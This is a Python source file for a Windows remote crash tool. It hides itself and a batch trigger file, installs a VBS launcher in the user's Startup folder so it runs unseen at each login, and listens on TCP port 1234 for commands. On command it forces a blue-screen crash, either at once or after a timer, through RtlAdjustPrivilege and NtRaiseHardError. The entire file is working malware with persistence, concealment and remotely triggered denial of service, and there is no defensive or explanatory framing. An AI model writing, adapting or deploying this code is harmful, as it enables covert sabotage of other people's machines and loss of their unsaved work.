from socket import socket, AF_INET, SOCK_STREAM, timeout
from subprocess import call
from getpass import getuser
from pathlib import Path
from sys import platform
from time import sleep
from threading import Thread


def trigger_bsod():
    from ctypes import windll
    from ctypes import c_int
    from ctypes import c_uint
    from ctypes import c_ulong
    from ctypes import POINTER
    from ctypes import byref

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )


def create_startup_file(trigger_file_path):
    startup_file = f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.vbs"
    file_contents = f"Set WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run chr(34) & \"{trigger_file_path}\" & Chr(34), 0\nSet WshShell = Nothing"

    with open(startup_file, "w+") as file:
        file.write(file_contents)

    print("Startup file created")


def create_trigger_file():
    trigger_file = Path(__file__).parent.joinpath("trigger.bat")
    call(f"attrib -H \"{str(trigger_file)}\"", shell=True)

    with open(trigger_file, "w+") as file:
        file.write(f"pythonw \"{__file__}\"")

    call(f"attrib +H \"{__file__}\"", shell=True)
    call(f"attrib +H \"{str(trigger_file)}\"", shell=True)

    print("Trigger file created")
    create_startup_file(str(trigger_file))


def sent_response_msg(connection_socket, msg):
    msg = f"{msg}".encode(encoding="utf8")
    connection_socket.sendall(bytes(msg))


def trigger_timer():
    global trigger_time
    while trigger_time > 0:
        sleep(1)
        trigger_time -= 1
    trigger_bsod()


if platform != "win32":
    print("Only Windows based systems!")
    input("Press enter to exit ")
    exit(1)

create_trigger_file()

PORT = 1234

trigger_time = 0
trigger_thread = Thread(target=trigger_timer)
started_thread = False

server = socket(AF_INET, SOCK_STREAM)
server.bind(("", PORT))
print("Service running")

while True:
    server.listen()

    print("\nService listening")

    connection, user_address = server.accept()
    connection.settimeout(60)

    print("Connection established\n")

    while True:
        try:
            data = connection.recv(1024)
            if data:
                decoded_data = data.decode(encoding="utf8")

                if decoded_data == "1":
                    sent_response_msg(connection, "Triggering BSOD")
                    trigger_bsod()
                    continue

                if decoded_data == "3":
                    sent_response_msg(connection, f"Trigger in {trigger_time} seconds")
                    continue

                if decoded_data.find(";"):
                    decoded_data, timer = decoded_data.split(";")
                    if decoded_data == "2" and timer:
                        trigger_time = int(timer)
                        sent_response_msg(connection, f"Settled, BSOD will be triggered in {trigger_time} seconds")
                        if not started_thread:
                            started_thread = True
                            trigger_thread.start()

                        continue

                sent_response_msg(connection, "Option not found or invalid formatting")
        except timeout:
            connection.close()
            print("Connection closed")
            break
